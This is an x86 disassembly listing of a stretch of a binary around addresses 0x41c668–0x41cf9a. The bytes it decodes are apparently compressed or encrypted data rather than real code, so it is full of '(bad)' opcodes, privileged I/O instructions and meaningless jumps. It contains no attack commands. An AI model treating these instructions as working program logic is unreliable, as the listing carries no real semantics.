  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	sbb    BYTE PTR [eax-0x13],dh
  41c671:	into   
  41c672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c673:	mov    dh,BYTE PTR [bx+di]
  41c676:	js     0x41c687
  41c678:	gs das 
  41c67a:	dec    esp
  41c67b:	inc    ebx
  41c67c:	pop    ss
  41c67d:	cmp    esi,DWORD PTR es:[esi-0x18]
  41c681:	bound  ebp,QWORD PTR [esi-0x41]
  41c684:	pop    edx
  41c685:	test   eax,0xc9415b
  41c68a:	lods   al,BYTE PTR ds:[esi]
  41c68b:	jmp    0x41c661
  41c68d:	mov    edx,DWORD PTR [ecx+0x202f284e]
  41c693:	adc    DWORD PTR [ecx-0x46],edx
  41c696:	xchg   DWORD PTR [ebx+0x7f],esi
  41c699:	ds push cs
  41c69b:	out    0x1a,eax
  41c69d:	shufps xmm7,XMMWORD PTR [ebx],0x9e
  41c6a1:	inc    eax
  41c6a2:	or     al,0x78
  41c6a4:	xor    DWORD PTR [eax+0x2],edx
  41c6a7:	in     eax,dx
  41c6a8:	and    al,BYTE PTR [eax+0x2e9506c0]
  41c6ae:	out    0x46,eax
  41c6b0:	jo     0x41c701
  41c6b2:	fnsave [ecx-0x35a4e4a3]
  41c6b8:	ret    0xbfa
  41c6bb:	cmp    BYTE PTR [ebp-0x5b],al
  41c6be:	inc    edi
  41c6bf:	aas    
  41c6c0:	or     DWORD PTR [ebp+0x75],edx
  41c6c3:	adc    DWORD PTR [edx+edi*4-0x40],edx
  41c6c7:	cli    
  41c6c8:	stos   DWORD PTR es:[di],eax
  41c6ca:	pop    ebx
  41c6cb:	push   esp
  41c6cc:	fisubr WORD PTR [esi+ebx*4]
  41c6cf:	xor    BYTE PTR [eax],al
  41c6d1:	arpl   WORD PTR [edx],bp
  41c6d3:	loop   0x41c70a
  41c6d5:	xlat   BYTE PTR ds:[ebx]
  41c6d6:	push   edx
  41c6d7:	call   0xdcb4:0x4156b05d
  41c6de:	in     eax,0x3c
  41c6e0:	and    BYTE PTR [edx+ebx*1],bl
  41c6e3:	xor    al,0x3f
  41c6e5:	jmp    0x41c73a
  41c6e7:	mov    DWORD PTR ds:[ecx+0x64],esi
  41c6eb:	push   ecx
  41c6ec:	ret    
  41c6ed:	adc    BYTE PTR [esi-0x3f9cda1],bh
  41c6f3:	fst    DWORD PTR [edi+ebp*2+0x1e]
  41c6f7:	imul   esi,DWORD PTR [ebx],0xb447d61a
  41c6fd:	int    0x9e
  41c6ff:	push   esp
  41c700:	fisttp WORD PTR [ebx+0x79]
  41c703:	pop    ss
  41c704:	(bad)  
  41c705:	adc    DWORD PTR [ebx],edx
  41c707:	inc    ebp
  41c708:	mov    ebx,0x885704a2
  41c70d:	out    dx,al
  41c70e:	xor    edx,edi
  41c710:	pop    ds
  41c711:	cli    
  41c712:	and    edi,ecx
  41c714:	sbb    DWORD PTR [esi+0x7c],esp
  41c717:	retf   0x241e
  41c71a:	jnp    0x41c731
  41c71c:	push   ebp
  41c71d:	inc    ebx
  41c71e:	pusha  
  41c71f:	push   ebp
  41c720:	xlat   BYTE PTR ds:[ebx]
  41c721:	sub    DWORD PTR [edx],ebp
  41c723:	sbb    al,0x51
  41c725:	(bad)  
  41c726:	loope  0x41c72e
  41c728:	ins    DWORD PTR es:[edi],dx
  41c729:	dec    edi
  41c72a:	imul   ebp,esp,0x1ce7c6b6
  41c730:	inc    edx
  41c731:	mov    eax,0x4eaee07
  41c736:	aaa    
  41c737:	push   esi
  41c738:	loope  0x41c7b6
  41c73a:	and    edx,0x5bc89ecc
  41c740:	jno    0x41c6c2
  41c742:	shl    DWORD PTR [esi+0xc],0x27
  41c746:	and    eax,0xb74e76a9
  41c74b:	mov    ds:0x9b32db8c,al
  41c750:	mov    dh,0xb1
  41c752:	fisttp DWORD PTR [ebx+ecx*2-0x309223bd]
  41c759:	fnstsw WORD PTR [esi]
  41c75b:	mov    eax,ds:0xce09b1e2
  41c760:	pop    edx
  41c761:	mov    bh,0xb9
  41c763:	mov    cl,0x20
  41c765:	dec    edi
  41c766:	and    ah,BYTE PTR [eax-0x46cb1d4c]
  41c76c:	sbb    ecx,DWORD PTR [esi+0x0]
	...
  41c7d3:	add    BYTE PTR [eax],al
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	jmp    0x41c7b1
  41c7e4:	pushf  
  41c7e5:	sti    
  41c7e6:	xor    al,BYTE PTR [bx+di]
  41c7e9:	add    BYTE PTR [eax],al
  41c7eb:	add    DWORD PTR [eax],eax
  41c7ed:	add    BYTE PTR ds:0xb675dd27,cl
  41c7f3:	imul   ebp,DWORD PTR [ebx+edi*8-0x71],0x71
  41c7f8:	imul   ebx,DWORD PTR [eax-0x867a671],0xf39635c7
  41c802:	mov    ds:0xeffa9b40,al
  41c807:	adc    eax,0x8b2c8a75
  41c80c:	push   0x76
  41c80e:	jo     0x41c7b2
  41c810:	test   DWORD PTR [ebx+0x43491f0d],edi
  41c816:	(bad)  
  41c817:	dec    esp
  41c818:	and    eax,0xf20a61b5
  41c81d:	leave  
  41c81e:	cmp    ebp,DWORD PTR [esi+ebx*1-0x4741fbe]
  41c825:	or     di,WORD PTR [edx]
  41c828:	lods   eax,DWORD PTR ds:[esi]
  41c829:	xchg   DWORD PTR [edi],ecx
  41c82b:	in     al,dx
  41c82c:	mov    bh,0x8b
  41c82e:	mov    ah,0x0
  41c830:	iret   
  41c831:	lds    edi,FWORD PTR [eax+0x6b184794]
  41c837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c838:	xor    al,0x7f
  41c83a:	mov    BYTE PTR [ecx],cl
  41c83c:	add    al,0x75
  41c83e:	push   edx
  41c83f:	xlat   BYTE PTR ds:[ebx]
  41c840:	fst    QWORD PTR ds:0xc2f135dc
  41c846:	sbb    BYTE PTR ds:0xbd094911,bl
  41c84c:	xor    esp,ebx
  41c84e:	data16 mov al,ds:0x2cd64b8c
  41c854:	push   ebp
  41c855:	xor    esi,DWORD PTR [edi]
  41c857:	stc    
  41c858:	call   FWORD PTR [ecx]
  41c85a:	adc    bh,al
  41c85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85d:	pop    edx
  41c85e:	lahf   
  41c85f:	push   es
  41c860:	xlat   BYTE PTR ds:[ebx]
  41c861:	mov    ds:0xdc3c3f1e,eax
  41c866:	push   esi
  41c867:	xchg   esp,eax
  41c868:	pop    eax
  41c869:	add    ebp,DWORD PTR [edx+0x3b]
  41c86c:	or     cl,BYTE PTR [edi+esi*8+0x21206538]
  41c873:	shl    ch,0xad
  41c876:	dec    edi
  41c877:	retf   0xafbf
  41c87a:	push   ss
  41c87b:	mov    dl,0x8c
  41c87d:	push   edx
  41c87e:	leave  
  41c87f:	or     al,0x5d
  41c881:	inc    ebp
  41c882:	mov    eax,ds:0x3c7c597f
  41c887:	fsubrp st(1),st
  41c889:	psrlw  mm0,QWORD PTR [edx]
  41c88c:	and    BYTE PTR [ecx],ch
  41c88e:	ss jl  0x41c8c6
  41c891:	inc    ebx
  41c892:	out    0x13,al
  41c894:	jnp    0x41c82a
  41c896:	push   edx
  41c897:	outs   dx,BYTE PTR ds:[esi]
  41c898:	push   ebp
  41c899:	push   ecx
  41c89a:	add    al,0x4a
  41c89c:	out    0x93,al
  41c89e:	fsubr  QWORD PTR [edi+0x2732e3c9]
  41c8a4:	dec    esp
  41c8a5:	fiadd  DWORD PTR [edx]
  41c8a7:	stos   BYTE PTR es:[edi],al
  41c8a8:	jbe    0x41c888
  41c8aa:	sqrtps xmm7,XMMWORD PTR [edx+ebx*4]
  41c8ae:	repz or al,0x31
  41c8b1:	mov    ah,0xb9
  41c8b3:	addr16 jmp 0xf8f1:0xd2cb2921
  41c8bb:	(bad)  
  41c8bd:	inc    edx
  41c8be:	sti    
  41c8bf:	xchg   ecx,eax
  41c8c0:	iret   
  41c8c1:	(bad)  [esp+edx*1-0x6]
  41c8c5:	sti    
  41c8c6:	cmp    bh,BYTE PTR ds:0xb4c2fb70
  41c8cc:	cmc    
  41c8cd:	jae    0x41c937
  41c8cf:	xor    DWORD PTR [edi+0xa4d267e],eax
  41c8d5:	ins    DWORD PTR es:[edi],dx
  41c8d6:	cmp    bl,bh
  41c8d8:	cmp    ch,BYTE PTR [esi]
  41c8da:	cli    
  41c8db:	ins    BYTE PTR es:[edi],dx
  41c8dc:	sbb    al,BYTE PTR [ecx]
  41c8de:	bnd jne 0x41c87b
  41c8e1:	shl    ch,1
  41c8e3:	pop    esi
  41c8e4:	sbb    ebp,esp
  41c8e6:	es jo  0x41c8e2
  41c8e9:	mov    ds:0x4bd76e09,al
	...
  41c956:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c95d:	ja     0x41c977
  41c95f:	sub    DWORD PTR [ebx],edi
  41c961:	add    DWORD PTR [edx-0x4b],esp
  41c964:	jae    0x41c93d
  41c966:	xor    eax,DWORD PTR [bx+di]
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    DWORD PTR [eax],eax
  41c96d:	add    BYTE PTR [edi],ch
  41c96f:	les    ebx,FWORD PTR [esi+0x37]
  41c972:	dec    edx
  41c973:	mov    ebp,0x53c06e36
  41c978:	loope  0x41c949
  41c97a:	(bad)  
  41c97b:	xor    bh,BYTE PTR [edi+0x17]
  41c97e:	leave  
  41c97f:	jge    0x41c94e
  41c981:	sbb    esp,DWORD PTR ds:0xba97db3a
  41c987:	mov    dl,0x46
  41c989:	jns    0x41c9aa
  41c98b:	pop    edx
  41c98c:	cmc    
  41c98d:	clc    
  41c98e:	jl     0x41c912
  41c990:	inc    ebx
  41c991:	adc    DWORD PTR ds:0xa5a4,esi
  41c996:	push   ss
  41c997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c998:	inc    ebp
  41c999:	mov    ds:0xf75a46b2,eax
  41c99e:	pop    edi
  41c99f:	(bad)  
  41c9a1:	jae    0x41c987
  41c9a3:	int3   
  41c9a4:	scas   eax,DWORD PTR es:[edi]
  41c9a5:	mov    ch,0xf
  41c9a7:	and    BYTE PTR [eax+0x2a],dh
  41c9aa:	mov    esi,0x88c0c507
  41c9af:	xchg   ebx,eax
  41c9b0:	xor    eax,0xb3b45a83
  41c9b5:	push   esi
  41c9b6:	dec    ebx
  41c9b7:	dec    ecx
  41c9b8:	and    DWORD PTR [esi+0x41],ebx
  41c9bb:	mov    bl,0xb3
  41c9bd:	push   ecx
  41c9be:	sub    ebp,DWORD PTR [ebx]
  41c9c0:	adc    eax,0x642de33c
  41c9c5:	fld    DWORD PTR [edx+0x32]
  41c9c8:	inc    ebx
  41c9c9:	outs   dx,BYTE PTR ds:[esi]
  41c9ca:	ins    DWORD PTR es:[edi],dx
  41c9cb:	pop    edi
  41c9cc:	ins    DWORD PTR es:[edi],dx
  41c9cd:	cmp    bh,BYTE PTR [edx+eiz*1]
  41c9d0:	daa    
  41c9d1:	cmp    ah,BYTE PTR [edx+0x8]
  41c9d4:	das    
  41c9d5:	dec    edi
  41c9d6:	test   BYTE PTR [ebx+ebp*2-0x4e2bb7dd],cl
  41c9dd:	out    0x3a,al
  41c9df:	lods   eax,DWORD PTR ds:[esi]
  41c9e0:	push   ecx
  41c9e1:	scas   eax,DWORD PTR es:[edi]
  41c9e2:	push   es
  41c9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9e4:	inc    ecx
  41c9e5:	outs   dx,BYTE PTR ds:[esi]
  41c9e6:	xor    al,0x4a
  41c9e8:	jbe    0x41c9be
  41c9ea:	ret    0x9d8e
  41c9ed:	jb     0x41c9ab
  41c9ef:	sub    ebp,esp
  41c9f1:	lock rol DWORD PTR ss:[ebp+0x47],0xc6
  41c9f7:	icebp  
  41c9f8:	loope  0x41c97b
  41c9fa:	mov    cl,0x27
  41c9fc:	xchg   DWORD PTR [ecx+eax*1+0x3483aa3f],esi
  41ca03:	cld    
  41ca04:	les    ebx,FWORD PTR [esi+0x6c]
  41ca07:	out    dx,al
  41ca08:	std    
  41ca09:	pop    edx
  41ca0a:	out    dx,al
  41ca0b:	cmc    
  41ca0c:	je     0x41ca23
  41ca0e:	xor    al,0x41
  41ca10:	fwait
  41ca11:	dec    ebp
  41ca12:	inc    edx
  41ca13:	push   cs
  41ca14:	cwde   
  41ca15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca16:	gs jbe 0x41ca7d
  41ca19:	xor    eax,0x691b8e71
  41ca1e:	(bad)  
  41ca1f:	xor    ch,al
  41ca21:	hlt    
  41ca22:	pop    esp
  41ca23:	repnz les ebp,FWORD PTR [esi+0x7e]
  41ca27:	and    BYTE PTR [ebp+0x5e],dh
  41ca2a:	jecxz  0x41ca26
  41ca2c:	xchg   esp,eax
  41ca2d:	addr16 xchg edx,eax
  41ca2f:	and    esp,esp
  41ca31:	jge    0x41ca1a
  41ca33:	add    al,0x49
  41ca35:	xchg   ecx,eax
  41ca36:	push   ebp
  41ca37:	shl    BYTE PTR [esi+ecx*4+0x684d94bc],0x35
  41ca3f:	jl     0x41ca8a
  41ca41:	addr16 loop 0x41ca09
  41ca44:	pusha  
  41ca45:	daa    
  41ca46:	into   
  41ca47:	iret   
  41ca48:	push   edi
  41ca49:	xor    BYTE PTR [edi-0x621fa024],dl
  41ca4f:	loope  0x41cac5
  41ca51:	mov    ch,0x27
  41ca53:	mov    WORD PTR [edi],cs
  41ca55:	mov    bl,0x52
  41ca57:	test   al,0x42
  41ca59:	pop    es
  41ca5a:	xchg   ah,dl
  41ca5c:	ror    DWORD PTR [edi+0x2],1
  41ca5f:	cs test eax,0x7c57216c
  41ca65:	imul   esi,DWORD PTR [ebx-0x58],0x84a2a81a
  41ca6c:	mov    eax,DWORD PTR [ecx+0x0]
	...
  41cad6:	lock retf 0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	xchg   ebx,eax
  41cae3:	outs   dx,BYTE PTR ds:[esi]
  41cae4:	lds    ecx,FWORD PTR [ecx]
  41cae6:	addr16 xor al,0x1
  41cae9:	add    BYTE PTR [eax],al
  41caeb:	add    DWORD PTR [eax],eax
  41caed:	add    BYTE PTR [edx-0x6b],dh
  41caf0:	ret    0xe954
  41caf3:	scas   eax,DWORD PTR es:[edi]
  41caf4:	jg     0x41cabb
  41caf6:	pop    es
  41caf7:	(bad)  
  41caf8:	out    dx,eax
  41caf9:	fldcw  WORD PTR [ecx+0x30bd5065]
  41caff:	inc    ebp
  41cb00:	retf   0x3127
  41cb03:	jg     0x41cb6e
  41cb05:	dec    esi
  41cb06:	jl     0x41cb20
  41cb08:	mov    gs,WORD PTR [esi+0x62]
  41cb0b:	jnp    0x41caed
  41cb0d:	fcomi  st,st(1)
  41cb0f:	xor    ebx,DWORD PTR [ebx-0x15]
  41cb12:	xchg   ebx,eax
  41cb13:	or     al,0xc3
  41cb15:	jb     0x41cb8c
  41cb17:	enter  0x5402,0xc5
  41cb1b:	mov    eax,ss
  41cb1d:	ins    BYTE PTR es:[edi],dx
  41cb1e:	ja     0x41cb9a
  41cb20:	fs mov cl,0x12
  41cb23:	mov    al,0x40
  41cb25:	jo     0x41cba4
  41cb27:	ds lods al,BYTE PTR gs:[esi]
  41cb2a:	(bad)  
  41cb2b:	data16 mov ch,0x90
  41cb2e:	inc    ecx
  41cb2f:	lahf   
  41cb30:	pop    ebx
  41cb31:	call   0xebb97f43
  41cb36:	add    bl,BYTE PTR [edx+0x4e]
  41cb39:	aad    0x1
  41cb3b:	scas   eax,DWORD PTR es:[edi]
  41cb3c:	add    DWORD PTR [edx-0x3a],esi
  41cb3f:	mov    esp,eax
  41cb41:	pop    ebp
  41cb42:	pop    esi
  41cb43:	fadd   DWORD PTR [esi-0x389bfccb]
  41cb49:	enter  0x9a7,0x87
  41cb4d:	mov    esp,0x870d5926
  41cb52:	mov    al,BYTE PTR ds:0x81bb89d0
  41cb58:	dec    eax
  41cb59:	inc    eax
  41cb5a:	dec    edi
  41cb5b:	add    cl,ch
  41cb5d:	call   0x42cf:0x47e21ae9
  41cb64:	enter  0xfda1,0x44
  41cb68:	dec    ebx
  41cb69:	adc    DWORD PTR [eax-0x1834044],0xffffff8e
  41cb70:	js     0x41cb52
  41cb72:	dec    esi
  41cb73:	test   BYTE PTR [edi+0x4dced230],0x36
  41cb7a:	or     cl,BYTE PTR [eax]
  41cb7c:	dec    ebp
  41cb7d:	pop    esi
  41cb7e:	push   ecx
  41cb7f:	add    eax,0x66e7ddb2
  41cb84:	inc    edi
  41cb85:	xlat   BYTE PTR ds:[ebx]
  41cb86:	enterw 0x5f7d,0x24
  41cb8b:	add    BYTE PTR [esi+0x6d],0x22
  41cb8f:	cmp    al,0x33
  41cb91:	push   cs
  41cb92:	adc    al,0x3a
  41cb94:	outs   dx,DWORD PTR ds:[esi]
  41cb95:	dec    edx
  41cb96:	fs inc edx
  41cb98:	jge    0x41cb83
  41cb9a:	lods   eax,DWORD PTR ds:[esi]
  41cb9b:	stos   BYTE PTR es:[edi],al
  41cb9c:	xor    eax,0x76262f04
  41cba1:	js     0x41cc1d
  41cba3:	nop
  41cba4:	xchg   edx,eax
  41cba5:	fnstcw WORD PTR [ecx-0x61]
  41cba8:	mov    al,ds:0x45315e43
  41cbad:	xchg   DWORD PTR [edx+0x5],eax
  41cbb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbb1:	sbb    eax,0x1219fcef
  41cbb6:	push   cs
  41cbb7:	inc    eax
  41cbb8:	inc    ebp
  41cbb9:	adc    al,0x84
  41cbbb:	dec    ebp
  41cbbc:	push   ecx
  41cbbd:	in     al,dx
  41cbbe:	inc    edi
  41cbbf:	stc    
  41cbc0:	jl     0x41cb9e
  41cbc2:	les    ebx,FWORD PTR [ebx-0xf]
  41cbc5:	adc    eax,0x212820cf
  41cbca:	ret    0x6345
  41cbcd:	mov    cl,0xe3
  41cbcf:	shl    BYTE PTR [edi],cl
  41cbd1:	fwait
  41cbd2:	(bad)
  41cbd5:	jne    0x41cc43
  41cbd7:	outs   dx,BYTE PTR ds:[esi]
  41cbd8:	pop    ss
  41cbd9:	aad    0x8a
  41cbdb:	es xchg edx,eax
  41cbdd:	add    eax,0x4a67266a
  41cbe2:	mov    ch,BYTE PTR [edi+0xd91bb07]
  41cbe8:	xchg   esi,eax
  41cbe9:	jg     0x41cbfe
  41cbeb:	pusha  
  41cbec:	add    eax,0x71
	...
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x5848ac22
  41cc65:	packuswb mm6,QWORD PTR ds:0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	xchg   esp,eax
  41cc6f:	iret   
  41cc70:	xor    eax,0xe4ec6bc
  41cc75:	dec    ebp
  41cc76:	or     BYTE PTR [esi],dh
  41cc78:	bound  esp,QWORD PTR ds:0x51ef7472
  41cc7e:	ret    
  41cc7f:	ss or  al,0xd0
  41cc82:	pop    ebp
  41cc83:	repnz cld 
  41cc85:	clc    
  41cc86:	xlat   BYTE PTR ds:[ebx]
  41cc87:	sub    ecx,eax
  41cc89:	call   0x69e7:0xbff89365
  41cc90:	mov    ch,0xa0
  41cc92:	xchg   esi,eax
  41cc93:	or     ebx,ebp
  41cc95:	mov    bl,0xf5
  41cc97:	int    0xc2
  41cc99:	sub    dh,BYTE PTR [edx]
  41cc9b:	fyl2xp1 
  41cc9d:	inc    edx
  41cc9e:	cld    
  41cc9f:	cmp    eax,0x6ca2cf59
  41cca4:	icebp  
  41cca5:	mov    al,ds:0x5c2fec5a
  41ccaa:	sub    ebx,edi
  41ccac:	das    
  41ccad:	ins    BYTE PTR es:[edi],dx
  41ccae:	fild   QWORD PTR [edx-0x2e]
  41ccb1:	rcl    DWORD PTR [edi],cl
  41ccb3:	dec    edi
  41ccb4:	ret    0xe0b7
  41ccb7:	sub    eax,0x3a826dc9
  41ccbc:	ucomiss xmm4,DWORD PTR [esi+0x5b]
  41ccc0:	cmp    ebx,DWORD PTR [edx-0x5f]
  41ccc3:	push   edi
  41ccc4:	mov    esp,0x680c58b5
  41ccc9:	sbb    ebx,esp
  41cccb:	sti    
  41cccc:	mov    esi,0xd9213e5d
  41ccd1:	fild   WORD PTR [edi+eax*4]
  41ccd4:	add    ebx,DWORD PTR [esi-0x2cf13ac2]
  41ccda:	fdivr  DWORD PTR [esp+edx*2]
  41ccdd:	dec    ebp
  41ccde:	pop    es
  41ccdf:	adc    DWORD PTR [edx+0x70dabebe],esi
  41cce5:	pop    ss
  41cce6:	pop    edi
  41cce7:	cmp    eax,0xc70eb14f
  41ccec:	lods   al,BYTE PTR ds:[esi]
  41cced:	push   cs
  41ccee:	add    al,0xcf
  41ccf0:	jnp    0x41cd30
  41ccf2:	test   al,0xf3
  41ccf4:	(bad)  
  41ccf5:	adc    DWORD PTR [edi],ebx
  41ccf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccf8:	cmp    eax,DWORD PTR [esi+edi*8+0x30]
  41ccfc:	dec    esp
  41ccfd:	xchg   esi,eax
  41ccfe:	sbb    edi,DWORD PTR [edx+0x36614b2c]
  41cd04:	dec    dh
  41cd06:	test   eax,0x23ffa5ec
  41cd0b:	out    0xa0,al
  41cd0d:	mov    ds:0xfedc78fa,al
  41cd12:	sub    al,bh
  41cd14:	stos   DWORD PTR es:[edi],eax
  41cd15:	jo     0x41ccaf
  41cd17:	ds sub eax,0xc390eacd
  41cd1d:	es leave 
  41cd1f:	or     al,0xd0
  41cd21:	ins    BYTE PTR es:[edi],dx
  41cd22:	jmp    0x41ccc0
  41cd24:	stos   DWORD PTR es:[edi],eax
  41cd25:	dec    ebx
  41cd26:	push   ebp
  41cd27:	or     BYTE PTR [esi],dl
  41cd29:	mov    ds:0x490c5c3,al
  41cd2e:	mov    ch,0x81
  41cd30:	pop    ss
  41cd31:	out    0xb8,eax
  41cd33:	pop    ss
  41cd34:	jns    0x41cd5c
  41cd36:	cmp    DWORD PTR [ecx],ecx
  41cd38:	js     0x41cd28
  41cd3a:	dec    edx
  41cd3b:	xor    dh,BYTE PTR [ebx+0x76929657]
  41cd41:	(bad)  
  41cd42:	cmp    al,0x22
  41cd44:	ret    0x2a05
  41cd47:	bound  ecx,QWORD PTR [ecx+0x16f6ed8d]
  41cd4d:	xor    al,0xbf
  41cd4f:	dec    esp
  41cd50:	push   0x5e
  41cd52:	std    
  41cd53:	mov    ch,0x70
  41cd55:	jl     0x41cd2a
  41cd57:	jbe    0x41cd0f
  41cd59:	out    0x1b,eax
  41cd5b:	sbb    al,0x2
  41cd5d:	inc    eax
  41cd5e:	out    0x8,al
  41cd60:	dec    edi
  41cd61:	(bad)  
  41cd62:	mov    esp,0xd66f5b6f
  41cd67:	xchg   ebp,eax
  41cd68:	das    
  41cd69:	pop    ss
  41cd6a:	jno    0x41cdae
  41cd6c:	lods   al,BYTE PTR ds:[esi]
  41cd6d:	fild   DWORD PTR [eax]
	...
  41cdd3:	add    BYTE PTR [eax],al
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	test   ah,0x39
  41cde5:	adc    eax,0x13667
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	sbb    al,dh
  41cdf0:	sbb    al,0x8
  41cdf2:	sbb    dh,ah
  41cdf4:	dec    esi
  41cdf5:	stos   DWORD PTR es:[edi],eax
  41cdf6:	mov    edx,0x86a7c2fc
  41cdfb:	mov    ebp,0xd384a418
  41ce00:	push   es
  41ce01:	inc    ecx
  41ce02:	add    al,0x13
  41ce04:	ret    0x7fe7
  41ce07:	cmp    ch,al
  41ce09:	add    ah,dl
  41ce0b:	jp     0x41ce42
  41ce0d:	scas   al,BYTE PTR es:[edi]
  41ce0e:	icebp  
  41ce0f:	xor    DWORD PTR ds:0x2e6bb2d8,edi
  41ce15:	and    dh,BYTE PTR [eax-0x6c]
  41ce18:	sbb    bh,BYTE PTR [ebp+0x2151a5b9]
  41ce1e:	mov    bl,0x25
  41ce20:	or     DWORD PTR [ebp+eiz*1-0x3a],esi
  41ce24:	mov    esi,0x49091e74
  41ce29:	clc    
  41ce2a:	cld    
  41ce2b:	mov    bl,0xd8
  41ce2d:	jb     0x41cdc0
  41ce2f:	push   ebp
  41ce30:	or     eax,0x9854dfe2
  41ce35:	push   0xffffff92
  41ce37:	ins    BYTE PTR es:[edi],dx
  41ce38:	sub    al,0x77
  41ce3a:	test   BYTE PTR [ecx+0x72],bl
  41ce3d:	cmp    esi,DWORD PTR [ebp+0x2c7afc11]
  41ce43:	mov    ebp,0x8738f7da
  41ce48:	inc    edi
  41ce49:	stos   BYTE PTR es:[edi],al
  41ce4a:	push   ecx
  41ce4b:	es push 0xa71c2700
  41ce51:	push   0x54ac7654
  41ce56:	or     eax,0x7cb84b3a
  41ce5b:	push   edi
  41ce5c:	dec    esi
  41ce5d:	inc    esi
  41ce5e:	adc    eax,edx
  41ce60:	push   eax
  41ce61:	mov    dh,0x46
  41ce63:	mov    esi,0x4ab3941e
  41ce68:	mov    ch,0x48
  41ce6a:	cmp    dl,bh
  41ce6c:	ja     0x41ce98
  41ce6e:	add    edx,ecx
  41ce70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce71:	jmp    0x73026b70
  41ce76:	inc    ecx
  41ce77:	pop    esp
  41ce78:	pop    edi
  41ce79:	dec    ebx
  41ce7a:	cs mov esi,ebp
  41ce7d:	mov    esp,0xd4c0af1c
  41ce82:	dec    edi
  41ce83:	jb     0x41cec1
  41ce85:	jle    0x41cefc
  41ce87:	std    
  41ce88:	sub    eax,0x818c6f01
  41ce8d:	fmul   QWORD PTR [ebp-0x54]
  41ce90:	xchg   edi,eax
  41ce91:	sahf   
  41ce92:	add    al,0x6a
  41ce94:	inc    esi
  41ce95:	arpl   WORD PTR [esi+edi*8-0x788708cd],ax
  41ce9c:	mov    dl,0xe9
  41ce9e:	dec    esp
  41ce9f:	dec    ecx
  41cea0:	cmp    al,0xf5
  41cea2:	and    al,0xfd
  41cea4:	cwde   
  41cea5:	dec    edx
  41cea6:	in     eax,dx
  41cea7:	pop    ss
  41cea8:	jns    0x41cf0f
  41ceaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ceab:	outs   dx,BYTE PTR ds:[esi]
  41ceac:	rol    DWORD PTR [ecx],cl
  41ceae:	push   edx
  41ceaf:	stc    
  41ceb0:	xchg   ebp,eax
  41ceb1:	out    0xe0,al
  41ceb3:	unpckhps xmm6,xmm4
  41ceb6:	mov    ds:0xb358959e,al
  41cebb:	outs   dx,BYTE PTR ds:[esi]
  41cebc:	or     BYTE PTR [ecx+0x29],dh
  41cebf:	lods   al,BYTE PTR ds:[esi]
  41cec0:	or     BYTE PTR [edi-0xe],ah
  41cec3:	clc    
  41cec4:	stos   DWORD PTR es:[edi],eax
  41cec5:	dec    edi
  41cec6:	sahf   
  41cec7:	jo     0x41ce92
  41cec9:	jb     0x41cf32
  41cecb:	mov    al,0x16
  41cecd:	scas   eax,DWORD PTR es:[edi]
  41cece:	pop    ebp
  41cecf:	jns    0x41cf1b
  41ced1:	and    eax,DWORD PTR [ebx]
  41ced3:	push   esp
  41ced4:	fwait
  41ced5:	retf   0x70e7
  41ced8:	xchg   esp,eax
  41ced9:	sbb    eax,0xb2574fc1
  41cede:	and    bl,BYTE PTR [edx-0xc1c91a8]
  41cee4:	lods   eax,DWORD PTR ds:[esi]
  41cee5:	mov    BYTE PTR ds:0x5469bdb1,ch
  41ceeb:	adc    BYTE PTR [ebp+0x5c],dl
	...
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	out    0x8b,eax
  41cf64:	xchg   edx,eax
  41cf65:	sbb    DWORD PTR [edi+0x37],esp
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	pop    ecx
  41cf6f:	pusha  
  41cf70:	(bad)  
  41cf71:	pop    eax
  41cf72:	and    cl,ch
  41cf74:	std    
  41cf75:	mov    ecx,0xe57ac5f6
  41cf7a:	ja     0x41cf55
  41cf7c:	xchg   esp,eax
  41cf7d:	sbb    esp,DWORD PTR [edi]
  41cf7f:	cmp    al,0x8a
  41cf81:	cmc    
  41cf82:	int    0xce
  41cf84:	inc    edx
  41cf85:	ins    DWORD PTR es:[edi],dx
  41cf86:	dec    ebp
  41cf87:	les    edx,FWORD PTR [ebx-0xbfcfa08]
  41cf8d:	adc    ebx,DWORD PTR [esi+0x4521ef17]
  41cf93:	vmaxss xmm4,xmm1,xmm3
  41cf97:	push   ss
  41cf98:	in     eax,dx
  41cf99:	dec    eax
  41cf9a:	std    
